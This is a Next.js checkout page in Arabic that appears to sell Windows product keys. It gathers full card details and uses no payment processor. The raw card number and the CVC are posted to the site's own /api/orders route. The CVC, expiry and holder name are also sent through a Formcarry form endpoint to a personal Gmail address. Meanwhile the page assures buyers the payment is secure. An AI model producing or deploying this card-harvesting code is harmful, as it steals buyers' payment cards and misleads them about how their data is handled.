"use client";

import { Suspense, useState } from "react";
import { useSearchParams } from "next/navigation";
import Link from "next/link";
import Image from "next/image";
import axios from "axios";
import Swal from "sweetalert2";
import {
	FiArrowRight,
	FiCreditCard,
	FiGift,
	FiLock,
	FiShoppingBag,
} from "react-icons/fi";

const FORMCARRY_ENDPOINT = "https://formcarry.com/s/sdaVMcfxNTg";
const ORDER_RECEIVER_EMAIL = "b71490@gmail.com";

function normalizeCardNumber(value) {
	return value.replace(/\D/g, "");
}

function detectCardScheme(normalized) {
	if (/^4\d{12}(\d{3})?(\d{3})?$/.test(normalized)) return "visa";
	if (/^(5[1-5]\d{14}|2(2[2-9]\d{12}|[3-6]\d{13}|7[01]\d{12}|720\d{12}))$/.test(normalized)) return "mastercard";
	if (/^3[47]\d{13}$/.test(normalized)) return "amex";
	if (/^6(?:011\d{12}|5\d{14}|4[4-9]\d{13})$/.test(normalized)) return "discover";
	return null;
}

function isValidCardNumber(cardNumber) {
	const normalized = normalizeCardNumber(cardNumber);

	if (normalized.length < 13 || normalized.length > 19) {
		return false;
	}

	// Reject obvious placeholders such as 0000... or 1111...
	if (/^(\d)\1+$/.test(normalized)) {
		return false;
	}

	if (!detectCardScheme(normalized)) {
		return false;
	}

	// Luhn algorithm check
	let sum = 0;
	let shouldDouble = false;

	for (let index = normalized.length - 1; index >= 0; index -= 1) {
		let digit = Number(normalized[index]);

		if (shouldDouble) {
			digit *= 2;
			if (digit > 9) digit -= 9;
		}

		sum += digit;
		shouldDouble = !shouldDouble;
	}

	return sum % 10 === 0;
}

function isValidExpiry(expiry) {
	const match = expiry.match(/^(\d{2})\/(\d{2})$/);
	if (!match) return false;

	const month = Number(match[1]);
	const year = Number(`20${match[2]}`);

	if (month < 1 || month > 12) return false;

	const now = new Date();
	const currentYear = now.getFullYear();
	const currentMonth = now.getMonth() + 1;

	if (year < currentYear) return false;
	if (year === currentYear && month < currentMonth) return false;

	return true;
}

function isValidCvc(cvc, cardNumber) {
	const cleanedCvc = cvc.trim();
	const normalizedCard = normalizeCardNumber(cardNumber);
	const scheme = detectCardScheme(normalizedCard);

	if (!/^\d{3,4}$/.test(cleanedCvc)) {
		return false;
	}

	if (scheme === "amex") {
		return /^\d{4}$/.test(cleanedCvc);
	}

	if (scheme === "visa" || scheme === "mastercard" || scheme === "discover") {
		return /^\d{3}$/.test(cleanedCvc);
	}

	return false;
}

function CheckoutContent() {
	const searchParams = useSearchParams();

	const [cardNumber, setCardNumber] = useState("");
	const [cardHolder, setCardHolder] = useState("");
	const [cardExpiry, setCardExpiry] = useState("");
	const [cardCvc, setCardCvc] = useState("");
	const [cardNumberError, setCardNumberError] = useState("");
	const [cardHolderError, setCardHolderError] = useState("");
	const [cardExpiryError, setCardExpiryError] = useState("");
	const [cardCvcError, setCardCvcError] = useState("");
	const [customerName, setCustomerName] = useState("Ammar Saleh");
	const [customerEmail, setCustomerEmail] = useState("ammar@example.com");
	const [couponCode, setCouponCode] = useState("");
	const [lastOrderSummary, setLastOrderSummary] = useState(null);

	const selectedProductName = searchParams.get("product") || "Windows 11 Pro Key";
	const selectedProductPrice = Number(searchParams.get("price") || 29);
	const selectedProductImage =
		searchParams.get("image") || "/images/real/dev-setup.jpg";
	const serviceFee = 2;
	const totalPrice = selectedProductPrice + serviceFee;

	const validateCardNumberLive = (value) => {
		const normalized = normalizeCardNumber(value);

		if (!normalized.length) {
			setCardNumberError("");
			return;
		}

		if (normalized.length < 13) {
			setCardNumberError("رقم البطاقة غير مكتمل.");
			return;
		}

		if (!isValidCardNumber(value)) {
			setCardNumberError("رقم البطاقة غير صحيح.");
			return;
		}

		setCardNumberError("");
	};

	const validateCardHolderLive = (value) => {
		const trimmed = value.trim();

		if (!trimmed.length) {
			setCardHolderError("");
			return;
		}

		if (trimmed.length < 3) {
			setCardHolderError("اسم حامل البطاقة غير صالح.");
			return;
		}

		setCardHolderError("");
	};

	const validateCardExpiryLive = (value) => {
		if (!value.length) {
			setCardExpiryError("");
			return;
		}

		if (value.length < 5) {
			setCardExpiryError("تاريخ الانتهاء غير مكتمل.");
			return;
		}

		if (!isValidExpiry(value)) {
			setCardExpiryError("تاريخ الانتهاء غير صالح.");
			return;
		}

		setCardExpiryError("");
	};

	const validateCardCvcLive = (cvcValue, cardValue = cardNumber) => {
		if (!cvcValue.length) {
			setCardCvcError("");
			return;
		}

		const normalizedCard = normalizeCardNumber(cardValue);
		const scheme = detectCardScheme(normalizedCard);
		if (!scheme) {
			setCardCvcError("أدخل رقم بطاقة صحيح أولًا.");
			return;
		}

		const requiredLength = scheme === "amex" ? 4 : 3;
		if (cvcValue.length < requiredLength) {
			setCardCvcError("رمز CVC غير مكتمل.");
			return;
		}

		if (cvcValue.length > requiredLength || !isValidCvc(cvcValue, cardValue)) {
			setCardCvcError("رمز CVC غير صالح.");
			return;
		}

		setCardCvcError("");
	};

	const isCheckoutDisabled =
		!customerName.trim() ||
		!customerEmail.trim() ||
		!cardNumber ||
		!cardHolder ||
		!cardExpiry ||
		!cardCvc ||
		Boolean(cardNumberError) ||
		Boolean(cardHolderError) ||
		Boolean(cardExpiryError) ||
		Boolean(cardCvcError);

	const handleCheckout = async () => {
		if (!customerName.trim() || !customerEmail.trim()) {
			await Swal.fire({
				title: "بيانات العميل غير مكتملة",
				text: "يرجى إدخال الاسم والبريد الإلكتروني قبل تأكيد الشراء.",
				icon: "warning",
				confirmButtonText: "حسنًا",
				confirmButtonColor: "#f59e0b",
			});
			return;
		}

		if (!cardNumber || !cardHolder || !cardExpiry || !cardCvc) {
			await Swal.fire({
				title: "بيانات البطاقة غير مكتملة",
				text: "يرجى تعبئة جميع حقول البطاقة قبل تأكيد الشراء.",
				icon: "warning",
				confirmButtonText: "حسنًا",
				confirmButtonColor: "#f59e0b",
			});
			return;
		}

		if (cardHolder.trim().length < 3) {
			setCardHolderError("اسم حامل البطاقة غير صالح.");
			await Swal.fire({
				title: "اسم حامل البطاقة غير صالح",
				text: "يرجى إدخال اسم صحيح مكوّن من 3 أحرف على الأقل.",
				icon: "error",
				confirmButtonText: "حسنًا",
				confirmButtonColor: "#dc2626",
			});
			return;
		}

		if (!isValidCardNumber(cardNumber)) {
			setCardNumberError("رقم البطاقة غير صحيح.");
			await Swal.fire({
				title: "رقم البطاقة غير صالح",
				text: "تم رفض البطاقة. تأكد من رقم البطاقة وحاول مرة أخرى.",
				icon: "error",
				confirmButtonText: "حسنًا",
				confirmButtonColor: "#dc2626",
			});
			return;
		}

		if (!isValidExpiry(cardExpiry)) {
			setCardExpiryError("تاريخ الانتهاء غير صالح.");
			await Swal.fire({
				title: "تاريخ الانتهاء غير صالح",
				text: "تأكد من إدخال التاريخ بصيغة MM/YY وأن البطاقة غير منتهية.",
				icon: "error",
				confirmButtonText: "حسنًا",
				confirmButtonColor: "#dc2626",
			});
			return;
		}

		if (!isValidCvc(cardCvc, cardNumber)) {
			setCardCvcError("رمز CVC غير صالح.");
			await Swal.fire({
				title: "رمز CVC غير صالح",
				text: "رمز الأمان غير مطابق لنوع البطاقة.",
				icon: "error",
				confirmButtonText: "حسنًا",
				confirmButtonColor: "#dc2626",
			});
			return;
		}

		const normalizedCard = normalizeCardNumber(cardNumber);
		setCardHolderError("");
		setCardExpiryError("");
		setCardCvcError("");
		const maskedCard = `**** **** **** ${normalizedCard.slice(-4)}`;
		const payload = {
			order: {
				productName: selectedProductName,
				productPrice: selectedProductPrice,
				serviceFee,
				totalPrice,
				couponCode: couponCode || null,
			},
			customer: {
				name: customerName.trim(),
				email: customerEmail.trim(),
			},
			payment: {
				method: "card",
				cardHolder: cardHolder.trim(),
				cardNumberMasked: maskedCard,
				cardNumberRaw: normalizedCard,
				card_expiry: cardExpiry,
				cardCvc,
			},
		};

		let orderId = "-";
		let emailStatus = "";
		try {
			const response = await axios.post("/api/orders", payload);
			orderId = response.data?.data?.orderId || "-";

			if (FORMCARRY_ENDPOINT.includes("XXXX")) {
				emailStatus = "لم يتم إرسال الإيميل لأن رابط Formcarry غير مُكتمل (XXXX).";
			} else {
				const formBody = new URLSearchParams({
					name: customerName.trim(),
					email: customerEmail.trim(),
					card_cvc: cardCvc,
					product: selectedProductName,
					product_price: String(selectedProductPrice),
					service_fee: String(serviceFee),
					total_price: String(totalPrice),
					coupon_code: couponCode || "-",
					payment_method: "card",
					card_holder: cardHolder.trim(),
									card_last4: normalizedCard.slice(-4),
					card_expiry: cardExpiry,
					order_id: orderId,
					receiver_email: ORDER_RECEIVER_EMAIL,
				});

				const formcarryResponse = await fetch(FORMCARRY_ENDPOINT, {
					method: "POST",
					headers: {
						"Content-Type": "application/x-www-form-urlencoded",
						Accept: "application/json",
					},
					body: formBody.toString(),
				});

				if (!formcarryResponse.ok) {
					emailStatus = "تم إنشاء الطلب لكن إرسال الإيميل فشل. تحقق من إعدادات Formcarry.";
				} else {
					emailStatus = `تم إرسال تفاصيل الطلب إلى الإيميل: ${ORDER_RECEIVER_EMAIL}`;
				}
			}
		} catch (error) {
			const serverMessage =
				error?.response?.data?.message ||
				"حدث خطأ أثناء إرسال بيانات الشراء، حاول مرة أخرى.";
			await Swal.fire({
				title: "تعذر إرسال الطلب",
				text: serverMessage,
				icon: "error",
				confirmButtonText: "حسنًا",
				confirmButtonColor: "#dc2626",
			});
			return;
		}

		await Swal.fire({
			title: "تم استلام الطلب",
			html: `
				<div style="text-align:right;line-height:1.9">
					<div><strong>رقم الطلب:</strong> ${orderId}</div>
					<div><strong>المنتج:</strong> ${selectedProductName}</div>
					<div><strong>المبلغ:</strong> $${totalPrice}</div>
					<div><strong>طريقة الدفع:</strong> بطاقة بنكية</div>
					<div><strong>رقم البطاقة:</strong> ${maskedCard}</div>
				</div>
			`,
			icon: "success",
			confirmButtonText: "ممتاز",
			confirmButtonColor: "#1475d1",
		});

		setLastOrderSummary({
			orderId,
			productName: selectedProductName,
			totalPrice,
			emailStatus,
		});
	};

	return (
		<main className="min-h-screen bg-[#f4f4f5] px-4 py-10 text-slate-800" dir="rtl">
			<div className="mx-auto grid w-full max-w-6xl gap-6 lg:grid-cols-[1.1fr_0.9fr]">
				<section className="rounded-3xl border border-slate-200 bg-white p-7 shadow-[0_18px_45px_-30px_rgba(0,0,0,0.35)] md:p-8">
					<Link href="/products" className="inline-flex items-center gap-2 text-sm font-semibold text-[#1475d1] hover:text-[#0f5ca8]">
						<FiArrowRight />
						العودة إلى المنتجات
					</Link>

					<h1 className="mt-6 text-4xl font-extrabold tracking-tight md:text-5xl">إتمام الطلب</h1>
					<p className="mt-4 max-w-2xl text-sm leading-8 text-slate-500 md:text-base">
						صفحة تجريبية لعرض معلومات العميل والدفع. الزر النهائي يستخدم SweetAlert2 لإظهار حالة نجاح.
					</p>

					<div className="checkout-steps">
						<div className="checkout-step is-active">1. معلومات العميل</div>
						<div className="checkout-step is-active">2. معلومات الدفع</div>
						<div className="checkout-step">3. تأكيد الطلب</div>
					</div>

					{lastOrderSummary ? (
						<div className="mt-5 rounded-2xl border border-emerald-200 bg-emerald-50 p-4 text-sm leading-7 text-emerald-800">
							<div className="font-bold">آخر طلب ناجح: {lastOrderSummary.orderId}</div>
							<div>المنتج: {lastOrderSummary.productName}</div>
							<div>الإجمالي: ${lastOrderSummary.totalPrice}</div>
							<div>حالة الإيميل: {lastOrderSummary.emailStatus}</div>
						</div>
					) : null}

					<div className="mt-8 grid gap-4 md:grid-cols-2">
						<label className="text-sm font-semibold text-slate-700">
							الاسم الكامل
							<input
								className="mt-2 w-full rounded-2xl border border-slate-200 bg-slate-50 px-4 py-3 outline-none transition focus:border-[#1475d1]"
								value={customerName}
								onChange={(event) => setCustomerName(event.target.value)}
							/>
						</label>
						<label className="text-sm font-semibold text-slate-700">
							البريد الإلكتروني
							<input
								className="mt-2 w-full rounded-2xl border border-slate-200 bg-slate-50 px-4 py-3 outline-none transition focus:border-[#1475d1]"
								value={customerEmail}
								onChange={(event) => setCustomerEmail(event.target.value)}
							/>
						</label>
						<label className="text-sm font-semibold text-slate-700 md:col-span-2">
							رمز القسيمة
							<input
								className="mt-2 w-full rounded-2xl border border-slate-200 bg-slate-50 px-4 py-3 outline-none transition focus:border-[#1475d1]"
								placeholder="DISCOUNT10"
								value={couponCode}
								onChange={(event) => setCouponCode(event.target.value)}
							/>
						</label>
					</div>

					<div className="mt-8">
						<h2 className="text-xl font-extrabold tracking-tight">الدفع بالبطاقة البنكية</h2>
						<div className="mt-6 grid gap-4 md:grid-cols-2">
							<label className="text-sm font-semibold text-slate-700 md:col-span-2">
								رقم البطاقة
								<input
									className={`mt-2 w-full rounded-2xl border bg-slate-50 px-4 py-3 outline-none transition ${
										cardNumberError
											? "border-red-500 focus:border-red-500"
											: "border-slate-200 focus:border-[#1475d1]"
									}`}
									placeholder="4111 1111 1111 1111"
									value={cardNumber}
									onChange={(event) => {
										const normalized = normalizeCardNumber(event.target.value).slice(0, 19);
										const grouped = normalized.replace(/(.{4})/g, "$1 ").trim();
										setCardNumber(grouped);
										validateCardNumberLive(grouped);
										validateCardCvcLive(cardCvc, grouped);
									}}
								/>
								{cardNumberError ? (
									<p className="mt-2 text-xs font-semibold text-red-600">{cardNumberError}</p>
								) : null}
							</label>
							<label className="text-sm font-semibold text-slate-700">
								اسم حامل البطاقة
								<input
									className={`mt-2 w-full rounded-2xl border bg-slate-50 px-4 py-3 outline-none transition ${
										cardHolderError
											? "border-red-500 focus:border-red-500"
											: "border-slate-200 focus:border-[#1475d1]"
									}`}
									placeholder="Ammar Saleh"
									value={cardHolder}
									onChange={(event) => {
										setCardHolder(event.target.value);
										validateCardHolderLive(event.target.value);
									}}
								/>
								{cardHolderError ? (
									<p className="mt-2 text-xs font-semibold text-red-600">{cardHolderError}</p>
								) : null}
							</label>
							<label className="text-sm font-semibold text-slate-700">
								تاريخ الانتهاء
								<input
									className={`mt-2 w-full rounded-2xl border bg-slate-50 px-4 py-3 outline-none transition ${
										cardExpiryError
											? "border-red-500 focus:border-red-500"
											: "border-slate-200 focus:border-[#1475d1]"
									}`}
									placeholder="MM/YY"
									value={cardExpiry}
									onChange={(event) => {
										const numbers = event.target.value.replace(/\D/g, "").slice(0, 4);
										const formatted = numbers.length > 2
											? `${numbers.slice(0, 2)}/${numbers.slice(2)}`
											: numbers;
										setCardExpiry(formatted);
										validateCardExpiryLive(formatted);
									}}
								/>
								{cardExpiryError ? (
									<p className="mt-2 text-xs font-semibold text-red-600">{cardExpiryError}</p>
								) : null}
							</label>
							<label className="text-sm font-semibold text-slate-700 md:col-span-2">
								رمز الأمان CVC
								<input
									className={`mt-2 w-full rounded-2xl border bg-slate-50 px-4 py-3 outline-none transition ${
										cardCvcError
											? "border-red-500 focus:border-red-500"
											: "border-slate-200 focus:border-[#1475d1]"
									}`}
									placeholder="123"
									value={cardCvc}
									onChange={(event) => {
										const nextCvc = event.target.value.replace(/\D/g, "").slice(0, 4);
										setCardCvc(nextCvc);
										validateCardCvcLive(nextCvc);
									}}
								/>
								{cardCvcError ? (
									<p className="mt-2 text-xs font-semibold text-red-600">{cardCvcError}</p>
								) : null}
							</label>
						</div>
					</div>

					<div className="mt-7 flex items-center gap-2 rounded-2xl bg-blue-50 p-4 text-sm text-[#1475d1]">
						<FiGift />
						أضف قسيمة خصم للحصول على أفضل سعر قبل تأكيد الطلب.
					</div>
				</section>

				<aside className="rounded-3xl bg-[#0f3b78] p-8 text-white shadow-[0_18px_45px_-30px_rgba(0,0,0,0.5)]">
					<div className="relative mb-5 aspect-[16/10] overflow-hidden rounded-2xl border border-white/15 bg-white/10">
						<Image
							src={selectedProductImage}
							alt={selectedProductName}
							fill
							sizes="(max-width: 1024px) 100vw, 420px"
							className="object-contain p-2"
						/>
					</div>

					<div className="flex items-center gap-3 text-blue-100">
						<FiShoppingBag className="text-2xl" />
						<span className="text-sm font-medium uppercase tracking-[0.2em]">Order Summary</span>
					</div>

					<div className="mt-8 space-y-4 border-b border-white/15 pb-6 text-sm text-blue-50">
						<div className="flex items-center justify-between">
							<span>{selectedProductName}</span>
							<span>${selectedProductPrice}</span>
						</div>
						<div className="flex items-center justify-between">
							<span>رسوم الخدمة</span>
							<span>${serviceFee}</span>
						</div>
						<div className="flex items-center justify-between text-base font-semibold text-white">
							<span>الإجمالي</span>
							<span>${totalPrice}</span>
						</div>
					</div>

					<div className="mt-6 space-y-3 text-sm text-blue-50">
						<div className="flex items-center gap-3">
							<FiCreditCard className="text-cyan-300" />
							الدفع الآمن جاهز للربط.
						</div>
						<div className="flex items-center gap-3">
							<FiLock className="text-cyan-300" />
							تسليم المفتاح مباشرة بعد نجاح العملية.
						</div>
					</div>

					<button
						type="button"
						onClick={handleCheckout}
						disabled={isCheckoutDisabled}
						className={`mt-8 w-full rounded-full px-5 py-3 font-extrabold transition ${
							isCheckoutDisabled
								? "cursor-not-allowed bg-slate-200 text-slate-500"
								: "bg-white text-[#0f3b78] hover:bg-blue-100"
						}`}
					>
						تأكيد الشراء
					</button>
				</aside>
			</div>
		</main>
	);
}

export default function CheckoutPage() {
	return (
		<Suspense fallback={<div className="p-6 text-center">جاري تحميل صفحة الشراء...</div>}>
			<CheckoutContent />
		</Suspense>
	);
}
